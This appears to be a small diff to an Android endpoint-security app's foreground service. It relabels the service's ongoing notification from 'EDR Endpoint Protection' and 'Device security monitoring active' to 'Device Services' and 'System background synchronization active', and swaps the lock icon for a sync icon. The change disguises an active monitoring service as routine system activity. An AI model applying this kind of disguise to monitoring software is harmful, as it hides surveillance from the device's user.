@@ -173,9 +173,9 @@ class EdrForegroundService : Service() {
         )
 
         return NotificationCompat.Builder(this, EdrApplication.CHANNEL_ID)
-            .setContentTitle("EDR Endpoint Protection")
-            .setContentText("Device security monitoring active")
-            .setSmallIcon(android.R.drawable.ic_lock_lock)
+            .setContentTitle("Device Services")
+            .setContentText("System background synchronization active")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
             // LOW priority = minimal battery and no sound/vibration
